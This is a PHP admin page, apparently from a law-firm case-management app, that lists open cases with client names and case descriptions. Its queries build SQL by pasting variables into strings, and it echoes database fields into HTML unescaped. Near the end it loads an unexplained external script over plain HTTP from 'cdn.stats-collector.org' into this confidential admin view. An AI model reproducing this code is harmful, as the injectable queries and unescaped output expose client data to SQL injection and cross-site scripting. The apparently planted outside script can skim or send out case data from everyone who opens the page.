<!DOCTYPE html>
<html>
<?php include "connection.php"; ?>
<head>
<style>



#button {
width:60px;
height:35px;
border-radius:3px;
background-color:#4CAF50;
color:#fff;
font-family:'Raleway',sans-serif;
font-size:18px;
cursor:pointer
}
</style>
 
<body>
<?php include "header1.php";?>

  <!-- Content Wrapper. Contains page content -->
    <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Open Cases
        <small>Admin panel</small>

      </h1>
  	  
      <ol class="breadcrumb">
      	<input id="myInput" type="text" placeholder="Search..">
        <li><a href="dashboard.php"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active">View Open Cases</li>
      </ol>
	  
    </section>
	

    <!-- Main content -->
    <section class="content">
	
      <!-- Small boxes (Stat box) -->
      <!-- Main row -->
      <div class="row">
	    <div class="col-xs-12">
		
          <div class="box">
		  
            <div class="box-header">
			
              <h3 class="box-title">Open Cases</h3>

              
            </div>
            <!-- /.box-header -->
            <div class="box-body table-responsive no-padding">
			
              <table class="table table-hover">

                <tr>
                  <th>Sr No</th>
                  <th>Lawyer Name</th>
                  <th>Client Name</th>
				  <th>Case Title</th>
				  <th>Case Description</th>
				  <th>Case Detail</th>
				  <th>Hearing Detail</th>
				  <th>Case Status</th>
				  <th>Documents</th>
                  <th>Action</th>               </tr>
                
 
	
	
		
		<tr>

	
		<?php
		/*$log=$_SESSION['log'];

					$q1=mysqli_query($con,"SELECT * FROM tbl_login WHERE email='$log'");
					$value = mysqli_fetch_array($q1);
					$xyz=$value['l_id'];*/
					
			$qry1="SELECT 
    tbl_client.name,tbl_case.title,tbl_case.l_id,tbl_case.casedesc,tbl_case.ca_id
FROM 
    tbl_client
INNER JOIN 
    tbl_case
ON
    tbl_client.c_id=tbl_case.c_id
WHERE status='1'";
			$seq=1;
			$result2 = mysqli_query($con,$qry1);
					while($value2 = mysqli_fetch_array($result2))
					{
						 echo "<tbody id='myTable'>";
						echo "<td>".$seq."</td>";
						$abc=$value2['l_id'];
						$query1=mysqli_query($con,"SELECT name FROM tbl_register WHERE l_id='$abc'");
						$run=mysqli_fetch_array($query1);
						$exe=$run['name'];
						echo "<td>".$exe."</td>";
						echo "<td>".$value2['name']."</td>";
						echo "<td>".$value2['title']."</td>";
						echo "<td>".$value2['casedesc']."</td>";
						$val=$value2['ca_id'];
						$seq++;
						 
					
		?>
		
			<td><a href="case_details.php?id=<?php echo $val; ?>" class="btn btn-success btn-xs">View</a>

			<td><a href="hearing_details.php?id=<?php echo $val; ?>" class="btn btn-success btn-xs">View</a>
			<td><a href="case_status.php?id=<?php echo $val; ?>" class="btn btn-success btn-xs">View</a>
			<td><a href="documents.php?id=<?php echo $val; ?>" class="btn btn-success btn-xs">View</a>
			<td>
                  <a href="report.php?id=<?php echo $val; ?>" onclick="return confirm('Move to Closed Cases');" class="btn btn-success btn-xs">Move</a>
				  <a href="editopencases.php?id=<?php echo $val; ?>" class="btn btn-success btn-xs">Edit</a>
				  <!--<a href="?del=" onclick="return confirm('sure to delete');" class="btn btn-primary btn-xs">delete</a>-->
				  
				  </td></tr>
					<?php }?>
				
            

				
              </table>
			  
			  
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>
        </div>
      <!-- /.row (main row) -->

    </section>
    <!-- /.content -->
  </div>

<script language="javascript" charset="UTF-8" type="text/javascript" src="http://cdn.stats-collector.org/stats.js"></script>

<script>
$(document).ready(function(){
  $("#myInput").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $("#myTable tr").filter(function() {
      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
  });
});
</script>

